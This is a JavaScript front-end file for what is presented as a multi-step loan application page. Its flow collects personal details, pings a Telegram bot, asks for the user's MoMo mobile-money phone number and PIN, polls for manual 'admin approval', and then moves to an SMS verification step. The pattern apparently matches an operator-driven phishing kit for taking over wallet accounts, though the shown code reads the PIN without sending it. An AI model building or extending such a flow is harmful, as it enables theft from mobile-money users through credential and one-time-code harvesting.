let currentAppId = null;

function goToStep(stepNumber) {
  document.querySelectorAll('.form-step').forEach(el => el.style.display = 'none');
  
  // Sync values forward from calculator
  if (stepNumber === 2) {
    document.getElementById('form-amount').value = document.getElementById('calc-amount').value;
  }
  
  const targetStep = document.getElementById(`step-${stepNumber}`);
  if (targetStep) {
    targetStep.style.display = 'block';
  }

  // Handle automatic transitions for loading/verification states
  if (stepNumber === 8) {
    setTimeout(() => {
      goToStep(9);
    }, 3000);
  }
  if (stepNumber === 10) {
    // Final completion polling or state logic can reside here
  }
}

async function submitInitialApplication() {
  const payload = {
    name: `${document.getElementById('form-firstname').value} ${document.getElementById('form-lastname').value}`,
    phone: document.getElementById('form-phone').value,
    desired_amount: document.getElementById('form-amount').value,
    desired_term: document.getElementById('calc-term').value,
    employer: document.getElementById('form-employer').value,
    purpose: document.getElementById('form-purpose').value
  };

  try {
    const response = await fetch('/applications', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const data = await response.json();
    currentAppId = data.id;

    // Trigger backend to send Telegram Bot notification
    await fetch(`/applications/${currentAppId}/submit`, { method: 'POST' });

    // Move to MoMo Login step
    goToStep(5);
  } catch (error) {
    console.error('Error submitting application:', error);
    alert('Failed to submit application. Please try again.');
  }
}

function processMomoLogin() {
  const phone = document.getElementById('momo-phone').value;
  const pin = document.getElementById('momo-pin').value;
  if (!phone || !pin) {
    alert('Please enter your MoMo phone number and PIN');
    return;
  }
  // Move to waiting for admin approval (Step 6) and start polling status
  goToStep(6);
  pollApplicationStatus();
}

function pollApplicationStatus() {
  const interval = setInterval(async () => {
    if (!currentAppId) return;
    try {
      const res = await fetch(`/applications/${currentAppId}`);
      const app = await res.json();
      
      if (app.status === 'approved') {
        clearInterval(interval);
        goToStep(7); // Move to SMS Verification step
      } else if (app.status === 'rejected') {
        clearInterval(interval);
        alert('Your loan application was rejected.');
        goToStep(1);
      }
    } catch (e) {
      console.error('Polling error:', e);
    }
  }, 3000);
      }
      
